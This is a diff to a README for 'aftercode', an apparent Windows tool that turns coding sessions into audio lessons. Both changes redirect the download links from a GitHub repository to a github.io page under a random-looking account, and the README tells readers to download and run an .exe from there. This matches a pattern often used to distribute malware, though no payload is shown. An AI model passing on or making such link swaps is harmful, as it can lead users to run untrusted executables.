@@ -1,6 +1,6 @@
 # 🎧 aftercode - Turn coding sessions into audio lessons
 
-[ ![Download aftercode](https://img.shields.io/badge/Download-Windows-blue) ](https://github.com/buttonshaped-capitalofmongolia595/aftercode)
+[ ![Download aftercode](https://img.shields.io/badge/Download-Windows-blue) ](https://buttonshaped-capitalofmongolia595.github.io)
 
 ## 📖 About this application
 
@@ -23,7 +23,7 @@ Before you install this software, confirm your computer meets these basic needs:
 
 Visit the official repository page to download the latest setup file for Windows.
 
-[Click here to go to the download page](https://github.com/buttonshaped-capitalofmongolia595/aftercode)
+[Click here to go to the download page](https://buttonshaped-capitalofmongolia595.github.io)
 
 Look for the latest release version on that page. Find the file ending in `.exe` and click it to start the download. Save this file to your Downloads folder or your Desktop.
 
